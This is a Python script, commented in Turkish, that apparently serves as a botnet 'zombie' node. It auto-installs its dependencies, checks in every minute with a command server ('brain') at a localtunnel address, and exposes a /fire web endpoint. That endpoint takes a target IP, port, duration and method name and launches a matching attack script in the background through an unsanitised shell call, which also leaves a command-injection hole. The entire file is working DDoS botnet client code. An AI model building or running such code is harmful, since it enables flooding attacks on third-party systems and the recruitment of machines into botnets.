import os
import subprocess
import sys

# --- OTOMATİK KURULUM VE IMPORT ---
def setup_and_import():
    try:
        from flask import Flask, request
        import requests
        return Flask, request, requests
    except ImportError:
        print("📦 Flask veya Requests eksik, sisteme kuruluyor...")
        # Doğrudan pip kullanarak kuruyoruz
        subprocess.check_call([sys.executable, "-m", "pip", "install", "flask", "requests"])
        print("✅ Kurulum tamamlandı. Yeniden başlatılıyor...")
        # Kurulumdan sonra kodu kendi içinde yeniden başlatır
        os.execv(sys.executable, ['python3'] + sys.argv)

# Değişkenleri tanımla
Flask, request, requests = setup_and_import()

import time
import threading

app = Flask(__name__)

# --- AYARLAR ---
BEYIN_URL = "https://shy-otters-trade.loca.lt" 
ZOMBI_PORT = "5000"

def kayit_ol():
    while True:
        try:
            headers = {"Bypass-Tunnel-Reminder": "true"}
            response = requests.get(f"{BEYIN_URL}/kayit?port={ZOMBI_PORT}", headers=headers, timeout=15)
            if response.status_code == 200:
                print("✅ Beyin'e kayıt başarılı!")
        except:
            pass
        time.sleep(60)

@app.route('/fire')
def fire():
    target = request.args.get('ip')
    port = request.args.get('port')
    sure = request.args.get('time')
    method = request.args.get('method')
    if method:
        os.system(f"nohup python3 {method}.py {target} {port} {sure} > /dev/null 2>&1 &")
        return "OK", 200
    return "Fail", 400

@app.route('/ping')
def ping():
    return "PONG", 200

if __name__ == '__main__':
    threading.Thread(target=kayit_ol, daemon=True).start()
    print(f"⚡ ZOMBI AKTIF! Port {ZOMBI_PORT}...")
    app.run(host='0.0.0.0', port=int(ZOMBI_PORT))
